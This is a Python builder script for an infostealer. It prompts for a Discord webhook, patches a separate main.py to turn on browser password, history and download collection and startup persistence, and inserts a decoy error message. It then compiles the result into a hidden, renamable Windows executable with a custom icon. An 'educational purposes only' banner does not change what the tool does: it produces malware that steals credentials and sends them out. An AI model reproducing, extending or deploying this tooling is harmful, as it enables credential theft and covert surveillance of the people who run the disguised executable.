import os
import sys
import shutil
import subprocess
import re

def clear_screen():
    os.system('cls')

def print_banner():
    print("""
    ╔═══════════════════════════════════════════╗
    ║           Executable Builder              ║
    ║       Educational Purposes Only           ║
    ╚═══════════════════════════════════════════╝
    """)

def validate_webhook(webhook):
    """Validate Discord webhook URL format"""
    pattern = r'^https://discord\.com/api/webhooks/\d+/[\w-]+$'
    return re.match(pattern, webhook) is not None

def validate_filename(filename):
    """Validate filename doesn't contain invalid characters"""
    return not any(c in filename for c in r'<>:"/\|?*')

def install_requirements():
    print("[*] Installing required packages...")
    packages = ["pyinstaller", "pillow", "requests", "pywin32", "cryptography", "psutil", "wmi"]
    
    for package in packages:
        print(f"[*] Installing {package}...")
        subprocess.run([sys.executable, "-m", "pip", "install", package], 
                      stdout=subprocess.PIPE, 
                      stderr=subprocess.PIPE)
    
    print("[+] All required packages installed successfully")

def modify_main_py(webhook_url, error_message, additional_options=None):
    """Modify main.py with the provided webhook URL and error message"""
    with open("main.py", "r") as f:
        content = f.read()
    
    # Replace webhook placeholder
    content = content.replace('WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"', 
                             f'WEBHOOK_URL = "{webhook_url}"')
    
    # Replace error message if provided
    if error_message:
        # Look for the messagebox.showerror line with a more flexible pattern
        error_pattern = r'messagebox\.showerror\([^)]+\)'
        new_error_line = f'messagebox.showerror("Error", "{error_message}")'
        content = re.sub(error_pattern, new_error_line, content)
    
    # Apply additional options if provided
    if additional_options:
        if additional_options.get('collect_passwords', False):
            # Add code to enable password collection
            content = content.replace('# PASSWORD_COLLECTION_ENABLED = False', 
                                     'PASSWORD_COLLECTION_ENABLED = True')
        
        if additional_options.get('collect_history', False):
            # Add code to enable browser history collection
            content = content.replace('# HISTORY_COLLECTION_ENABLED = False', 
                                     'HISTORY_COLLECTION_ENABLED = True')
        
        if additional_options.get('collect_downloads', False):
            # Add code to enable downloads history collection
            content = content.replace('# DOWNLOADS_COLLECTION_ENABLED = False', 
                                     'DOWNLOADS_COLLECTION_ENABLED = True')
            
        if additional_options.get('startup_persistence', False):
            # Add code to enable startup persistence
            content = content.replace('# ENABLE_STARTUP_PERSISTENCE = False', 
                                     'ENABLE_STARTUP_PERSISTENCE = True')
    
    # Write modified content back
    with open("main_modified.py", "w") as f:
        f.write(content)
    
    return "main_modified.py"

def build_executable(input_file, output_name, icon_path=None):
    """Build executable using PyInstaller"""
    print("[*] Building executable...")
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        f"--name={output_name}"
    ]
    
    if icon_path and os.path.exists(icon_path):
        cmd.append(f"--icon={icon_path}")
    
    cmd.append(input_file)
    
    process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    if process.returncode != 0:
        print("[!] Error building executable:")
        print(process.stderr.decode())
        return False
    
    # Copy executable to current directory
    dist_path = os.path.join("dist", f"{output_name}.exe")
    if os.path.exists(dist_path):
        shutil.copy2(dist_path, f"{output_name}.exe")
        print(f"[+] Executable created: {output_name}.exe")
        return True
    else:
        print("[!] Failed to create executable")
        return False

def cleanup(modified_file):
    """Clean up temporary files"""
    print("[*] Cleaning up temporary files...")
    
    # Remove modified main file
    if os.path.exists(modified_file):
        os.remove(modified_file)
    
    # Remove PyInstaller build directories
    if os.path.exists("build"):
        shutil.rmtree("build")
    
    if os.path.exists("dist"):
        shutil.rmtree("dist")
    
    # Remove spec file
    spec_files = [f for f in os.listdir() if f.endswith(".spec")]
    for spec_file in spec_files:
        os.remove(spec_file)
    
    print("[+] Cleanup complete")

def main():
    clear_screen()
    print_banner()
    
    # Check if main.py exists
    if not os.path.exists("main.py"):
        print("[!] Error: main.py not found in the current directory")
        return
    
    # Install requirements
    install_requirements()
    
    # Get Discord webhook URL
    while True:
        webhook_url = input("\n[?] Enter your Discord webhook URL: ").strip()
        if validate_webhook(webhook_url):
            break
        print("[!] Invalid webhook URL format. It should look like: https://discord.com/api/webhooks/123456789/abcdef-ghijkl")
    
    # Get application name
    while True:
        app_name = input("[?] Enter the name for your executable (without .exe): ").strip()
        if app_name and validate_filename(app_name):
            break
        print("[!] Invalid filename. Please avoid special characters like < > : \" / \\ | ? *")
    
    # Get custom error message
    error_message = input("[?] Enter a custom error message (or press Enter to use default): ").strip()
    
    # Additional data collection options
    print("\n[*] Additional data collection options:")
    collect_passwords = input("[?] Collect browser passwords? (y/n): ").strip().lower() == 'y'
    collect_history = input("[?] Collect browser history? (y/n): ").strip().lower() == 'y'
    collect_downloads = input("[?] Collect download history? (y/n): ").strip().lower() == 'y'
    startup_persistence = input("[?] Enable startup persistence? (y/n): ").strip().lower() == 'y'
    
    additional_options = {
        'collect_passwords': collect_passwords,
        'collect_history': collect_history,
        'collect_downloads': collect_downloads,
        'startup_persistence': startup_persistence
    }
    
    # Get icon path (optional)
    icon_path = input("[?] Enter path to custom icon .ico file (or press Enter to skip): ").strip()
    if icon_path and not os.path.exists(icon_path):
        print(f"[!] Warning: Icon file not found at {icon_path}. Continuing without custom icon.")
        icon_path = None
    
    # Modify main.py with webhook URL and error message
    modified_file = modify_main_py(webhook_url, error_message, additional_options)
    
    # Build executable
    success = build_executable(modified_file, app_name, icon_path)
    
    # Clean up
    cleanup(modified_file)
    
    if success:
        print("\n[+] Build completed successfully!")
        print(f"[+] Your executable is ready: {app_name}.exe")
        print("[!] Remember: This tool is for educational purposes only.")
    else:
        print("\n[!] Build failed. Please check the errors above.")

if __name__ == "__main__":
    main()